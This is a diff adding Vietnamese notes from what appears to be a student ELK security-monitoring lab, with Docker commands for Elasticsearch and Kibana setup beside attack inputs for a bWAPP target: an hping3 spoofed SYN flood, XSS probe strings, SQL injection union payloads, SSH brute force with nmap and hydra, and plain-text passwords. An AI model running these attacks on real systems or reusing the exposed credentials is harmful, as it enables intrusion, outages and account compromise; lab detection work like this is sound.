@@ -1,0 +1,62 @@
+- lấy token
+docker exec -it 35b5852f160d /usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s kibana
+
+- tạo key store
+docker exec -it elasticsearch /bin/bash
+
+/usr/share/elasticsearch/bin/elasticsearch-keystore create
+
+- lấy code
+docker logs 90d67e56eac6
+
+- reset mật khẩu
+docker exec -it elasticsearch /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic
+
+- đổi mật khẩu kibana_system
+docker exec -it elasticsearch /usr/share/elasticsearch/bin/elasticsearch-reset-password -u kibana_system
+
+- mật khẩu elastic (hiện tại): _xXjZTS5fdWnqGmWQNy5
+
+- mật khẩu ứng dựng (để gửi email): rkpt vxgz bulu vkpr
+
+- sửa lỗi lệch giờ:
+docker exec -it --user root elasticsearch bash
+apt-get update
+apt-get install ntp
+service ntp start #khởi động lại dịch vụ ntp
+exit #thoát
+docker exec -it elasticsearch date #kiểm tra 
+
+- file log của bwapp (apache): /var/log/apache2/access.log
+
+- hping3 -S --flood -d 12000 -i u1 --spoof 192.168.1.100 -p 80 172.19.0.10
+
+- ssh: ssh root@172.19.0.6
+Nhập mật khẩu là password
+
+
+
+- cài ping: apt install iputils-ping
+
+>""<script>document.cookie=true;</script>
+>""<script>document.cookie=true;//<</script>
+>""</title><script>document.cookie=true;</script>
+>""<img src=""javascript:document.cookie=true;"">
+
+-8707') union all select 5609,5609,5609--
+-7971' union all select 4273#
+-8809'||(select 'hyzr' where 5694=5694 union all select 5694--
+-9178 where 2253=2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#
+
+
+- bruteforce bằng nmap: nmap --script ssh-brute -p 22 172.19.0.5
+
+- hydra: 
+hydra -l user -P /home/myuser/password/password.txt ssh://172.19.0.8
+
+- tăng tải: 
+stress --cpu 4 --timeout 60
+stress --vm 2 --vm-bytes 128M --timeout 60
+stress --cpu 4 --vm 2 --vm-bytes 512M --io 4 --timeout 60
+
+docker cp "D:\study\GSANM\ELK\backup\elk-stack-master 1\10-million-password-list-top-1000.txt" demo_container:/
